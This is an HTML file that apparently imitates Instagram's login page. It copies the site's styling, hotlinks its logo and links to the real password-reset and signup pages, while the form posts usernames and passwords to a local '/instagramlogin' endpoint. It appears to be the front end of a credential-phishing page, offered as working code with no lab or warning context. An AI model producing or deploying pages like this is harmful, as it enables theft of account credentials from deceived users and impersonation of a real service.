<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            text-align: center;
            max-width: 350px;
            width: 100%;
        }
        .logo {
            width: 175px;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            font-size: 14px;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            padding: 5px 9px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            text-decoration: none;
        }
        .signup {
            color: #0095f6;
            font-weight: 600;
            font-size: 14px;
            line-height: 18px;
            margin-top: 15px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram logo" class="logo">
        <form action="/instagramlogin" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" aria-label="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" aria-label="Password" required>
            <button type="submit">Log In</button>
        </form>
        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot your password?</a>
        <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup">Sign up</a></p>
    </div>
</body>
</html>
